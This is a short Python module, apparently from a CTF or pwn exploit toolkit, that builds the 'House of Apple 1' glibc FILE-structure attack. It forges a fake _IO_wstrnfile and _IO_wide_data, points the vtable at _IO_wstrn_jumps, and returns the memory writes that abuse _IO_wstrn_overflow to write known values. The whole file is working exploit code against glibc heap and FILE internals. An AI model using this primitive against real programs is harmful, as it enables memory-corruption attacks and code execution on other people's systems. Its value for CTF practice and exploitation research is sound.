"""House of Apple 1 _IO_wstrn_overflow known-value write plan."""
from dataclasses import dataclass

@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str

def _p(v: int) -> bytes:
    if not isinstance(v, int) or not 0 <= v < 1 << 64: raise ValueError("value must fit uint64")
    return v.to_bytes(8, "little")

def build_house_of_apple1(*, fake_file_addr: int, wide_data_addr: int,
                          wstrn_jumps_addr: int, file_mode: int = 1) -> tuple[MemoryWrite, ...]:
    """生成 Apple1 的 fake FILE 和八个已知值写入。

    fake_file_addr: fake `_IO_wstrnfile` 起点；wide_data_addr: 目标 `_IO_wide_data`。
    wstrn_jumps_addr: 目标 libc 的合法 `_IO_wstrn_jumps`，必须按 Build ID 解析。
    file_mode: FILE `_mode`，PoC 默认 1 以保持宽字符路径。
    """
    if file_mode < 0 or file_mode >= 1 << 32: raise ValueError("invalid file_mode")
    known = fake_file_addr + 0xF0
    wide = bytearray(0x40)
    for off in (0x00, 0x10, 0x18, 0x20, 0x28, 0x30): wide[off:off+8] = _p(known)
    for off in (0x08, 0x38): wide[off:off+8] = _p(known + 0x100)
    file = bytearray(0xE0)
    file[0xA0:0xA8] = _p(wide_data_addr)
    file[0xC0:0xC4] = file_mode.to_bytes(4, 'little')
    file[0xD8:0xE0] = _p(wstrn_jumps_addr)
    return (MemoryWrite(fake_file_addr, bytes(file), 'fake _IO_wstrnfile'),
            MemoryWrite(wide_data_addr, bytes(wide), 'Apple1 wide_data known writes'))
